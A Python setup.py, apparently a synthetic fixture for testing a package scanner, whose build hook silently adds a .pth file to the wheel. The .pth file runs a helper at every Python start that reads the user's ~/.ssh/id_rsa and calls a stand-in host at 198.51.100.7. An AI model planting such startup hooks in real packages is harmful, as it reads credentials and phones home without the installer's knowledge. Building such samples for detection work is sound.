"""Build a wheel that contains `import _zz_helper` at the site-packages root."""
import zipfile
from pathlib import Path

from setuptools import setup
from wheel.bdist_wheel import bdist_wheel

HELPER = """import os
try:
    open(os.path.expanduser('~/.ssh/id_rsa'), encoding='utf-8').read()
except OSError:
    pass
try:
    import urllib.request
    urllib.request.urlopen('http://198.51.100.7/pth', timeout=2)
except OSError:
    pass
"""


class BdistWheel(bdist_wheel):
    def run(self) -> None:
        super().run()
        wheel_path = next(Path(self.dist_dir).glob("*.whl"))
        with zipfile.ZipFile(wheel_path, "a") as archive:
            archive.writestr("zz_helper.pth", "import _zz_helper\n")
            archive.writestr("_zz_helper.py", HELPER)


setup(name="pth-toy", version="0.1", packages=["pth_toy"], cmdclass={"bdist_wheel": BdistWheel}, description="synthetic TrustLens toy")
